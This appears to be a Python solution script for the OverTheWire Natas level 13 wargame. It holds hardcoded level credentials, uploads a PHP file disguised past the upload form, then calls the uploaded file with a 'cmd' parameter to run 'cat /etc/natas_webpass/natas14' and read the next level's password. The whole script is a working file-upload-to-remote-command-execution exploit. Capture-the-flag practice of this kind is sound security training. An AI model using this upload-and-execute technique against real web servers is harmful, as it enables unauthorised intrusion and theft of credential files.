import requests
import re

username = 'natas13'
password = 'lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9'

url = 'http://%s.natas.labs.overthewire.org/' % username

# Key is name in input tag => example <input name="uploadedfile" type="file" /><br />
# Value is tuple [0]: name of the file, [1]: open(filename,mode), [2]: mime-type
file = {'uploadedfile':(open('info.php', 'r+'))}

with open('natas13.html', 'w+') as out:
    session = requests.Session()
    # res = session.get(url, auth=(username, password))
    res = session.post(url, auth=(username, password),data={'filename':'info.php','MAX_FILE_SIZE': '1000'}, files=file)
    path_upload = re.findall('<a href="(.*)">upload/',res.text)[0]
    # path_upload = 'upload/bc4mof8tt9.php'
    res = session.get(url+'/'+path_upload+'?cmd=cat /etc/natas_webpass/natas14', auth=(username, password))
    print(res.status_code)
    print(res.text)
    out.write(res.text)
